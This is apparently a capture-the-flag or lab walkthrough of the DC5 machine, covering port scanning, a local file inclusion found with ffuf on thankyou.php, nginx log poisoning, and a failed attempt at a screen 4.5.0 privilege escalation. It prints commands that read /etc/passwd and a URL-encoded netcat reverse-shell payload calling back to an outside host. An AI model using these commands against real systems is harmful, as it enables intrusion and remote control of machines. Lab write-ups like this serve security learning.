DC5

Target IP: 192.168.228.26

Scanning


There are three TCP ports open on the target machine: HTTP, RPC, and another RPC. I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application.


After some manual enumeration, I find the contact.php page interesting. Depending on the input size, the Copyright changes; for example, in the image above it shows 2017.


In the picture above, the 2020 is shown.


After testing this page for LFI using the command ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.228.26/thankyou.php?FUZZ=../../../../../../../etc/passwd -fs 852 , I notice a parameter called file exists. It looks like the footer is included and can be exploited.


I am able to include the /etc/passwd file at the footer using the parameter file. I wonder if I can posion any logs?


Running the command ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.228.26/thankyou.php?file=../../../../../../../FUZZ -fs 835 shows two interesting log files:

  • /var/log/nginx/access.log
  • /var/log/nginx/error.log


I tried to poison the error.log file multiple times, but it did not work. It worked after I reverted the machine. The output above is after the target machine executed the commands whoami;id;ls.

Exploitation


I now have a foothold on the machine. I sent the payload rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.246%208443%20%3E%2Ftmp%2Ff to obtain a reverse shell connection on port 8443 on my local machine. Now I have a foothold on the machine.

Privilege Escalation


The screen 4.5.0 is vulnerable.



I tried to gain a root shell by using the exploit above, but I have no luck. I tried separating the exploit into multiple files, but nothing is working. And it looks like this is the only path to obtain a root on this machine.
